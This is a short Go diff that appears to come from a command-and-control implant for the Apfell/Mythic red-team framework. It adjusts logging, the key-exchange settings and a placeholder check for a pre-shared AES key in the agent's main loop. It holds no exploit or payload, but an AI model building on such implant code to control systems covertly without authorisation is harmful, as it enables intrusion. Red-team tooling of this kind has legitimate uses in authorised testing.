@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"log"
 	"os/user"
 	"strconv"
 	"strings"
@@ -53,14 +52,18 @@ func main() {
 	profile.SetUserAgent(profiles.UserAgent)
 	// Evaluate static variables
 	if strings.Contains(profiles.ExchangeKeyString, "T") {
+		//log.Println("Xchange keys true")
 		profile.SetXKeys(true)
 	} else {
+		//log.Println("Xchange keys false")
 		profile.SetXKeys(false)
 	}
 
-	if !strings.Contains(profiles.AesPSK, "PSK_REPLACE") && len(profiles.AesPSK) > 0 {
+	if !strings.Contains(profiles.AesPSK, "AESPSK") && len(profiles.AesPSK) > 0 {
+		//log.Println("Aes pre shared key is set")
 		profile.SetAesPreSharedKey(profiles.AesPSK)
 	} else {
+		//log.Println("Aes pre shared key is not set")
 		profile.SetAesPreSharedKey("")
 	}
 
@@ -289,7 +292,6 @@ func main() {
 				} else {
 					profile.PostResponse(toApfell.TaskItem, string(toApfell.TaskResult))
 				}
-
 			case <-time.After(1 * time.Second):
 				break
 			}
